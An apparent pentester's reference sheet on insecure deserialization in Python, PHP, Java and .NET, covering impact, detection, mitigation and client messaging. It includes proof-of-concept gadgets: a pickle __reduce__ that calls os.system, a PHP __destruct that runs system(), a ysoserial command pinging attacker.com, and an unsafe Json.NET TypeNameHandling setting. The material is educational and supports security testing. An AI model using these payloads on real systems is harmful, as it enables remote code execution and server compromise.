Insecure Deserialization Summary (Python, PHP, Java, .NET)

This document provides an overview of insecure deserialization vulnerabilities across major ecosystems. It includes high-level descriptions, language-specific behaviors, PoC strategies, and guidance for red teamers and client-facing demonstrations.

⸻

What Is Insecure Deserialization?

Deserialization is the process of turning structured input (e.g. JSON, XML, binary) into native in-memory objects. If this process accepts untrusted input without validation or safety checks, it can lead to serious vulnerabilities including:
	•	Remote Code Execution (RCE)
	•	Arbitrary file writes or reads
	•	Object property injection
	•	Logic manipulation or bypass

⸻

Business Impact

Risk Scenario	Impact Level	Real-World Effect
Remote code execution via gadgets	Critical	Full compromise of server
Property overwrite of internal objects	High	Authentication bypass, privilege escalation
File write/read	High	Leaking secrets, installing webshells
Application logic manipulation	Medium	Bypassing validation, triggering errors


⸻

Language-Specific Behavior

Python

Vulnerable Functions/Modules:
	•	pickle.load() / pickle.loads()
	•	yaml.load() (unsafe mode)
	•	marshal.loads()
	•	jsonpickle (automatically restores objects)

Payload Format: base64-encoded or direct binary

Common Exploit Tools:
	•	pickletools, os.system gadgets
	•	Custom class with __reduce__()

import pickle, base64
class RCE:
    def __reduce__(self):
        import os
        return (os.system, ("calc",))

payload = base64.b64encode(pickle.dumps(RCE())).decode()


⸻

PHP

Vulnerable Functions:
	•	unserialize()

Common Gadget Chains:
	•	Magic methods like __wakeup(), __destruct(), __toString()
	•	Popular libraries: Laravel, Monolog, Slim, Symfony

class Exploit {
    public $cmd = 'id';
    function __destruct() {
        system($this->cmd);
    }
}

echo serialize(new Exploit);

Defense Bypass:
	•	Encoded payloads in cookies, POST fields

⸻

Java

Vulnerable Libraries/Classes:
	•	Apache Commons Collections
	•	Spring Beans
	•	Java Serialization (ObjectInputStream)

Common Tooling:
	•	ysoserial (payload generator)

Payload Usage:
	•	Injected into serialized session, form data, encrypted tokens

java -jar ysoserial.jar CommonsCollections1 'ping attacker.com' > payload.ser

Execution Sink:
	•	readObject(), readResolve(), custom deserialization logic

⸻

.NET

Vulnerable APIs:
	•	BinaryFormatter.Deserialize()
	•	SoapFormatter
	•	JSON.NET w/ TypeNameHandling

Payload Structure:
	•	Binary (for BinaryFormatter) or JSON (for Json.NET)

Tools:
	•	ysoserial.net, SharpSerializer, FastJSON

// Dangerous: allows type specification in JSON
JsonConvert.DeserializeObject(json, settings: new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All
});

Common Gadget Chains:
	•	ObjectDataProvider
	•	WindowsIdentity

⸻

Detection Strategies

Technique	Details
Source code review	Look for unserialize, load, etc
Taint analysis	Track untrusted input to deserializers
Fuzzing with payloads	Use out-of-spec serialized data
Behavior timing / error messages	Server errors or delays on crafted inputs


⸻

Common Injection Points
	•	Encrypted or base64-encoded session cookies
	•	JWT tokens (especially if using non-standard formats)
	•	Hidden POST fields (especially in admin forms)
	•	REST API inputs where binary blobs are accepted

⸻

Mitigation Recommendations
	•	Avoid native deserialization of untrusted data entirely
	•	Use safe parsing modes (e.g. yaml.safe_load)
	•	Use allowlists of permitted classes/types
	•	Sign/verify or encrypt serialized data (with caution)
	•	Monitor/log deserialization errors aggressively

⸻

What to Tell the Client
	•	“This vulnerability allows an attacker to inject crafted data that results in arbitrary code execution.”
	•	“Deserialization bugs often bypass normal authentication and access control.”
	•	“These are usually silent attacks — they don’t show up in logs unless specifically monitored.”
	•	“Safe libraries or config flags exist for all major platforms and should be enforced as default.”

⸻

Tools for Testing
	•	ysoserial (Java)
	•	ysoserial.net (.NET)
	•	pickle/jsonpickle/ruamel.yaml (Python)
	•	PHP PoCs using serialized object chains
	•	Burp Suite + Turbo Intruder for fuzzing

⸻

Related CWE References
	•	CWE-502: Deserialization of Untrusted Data
	•	CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes
	•	CWE-20: Improper Input Validation

⸻

Feel free to copy this summary into your course prep, pentest reports, or share with clients as a technical overview + risk explanation.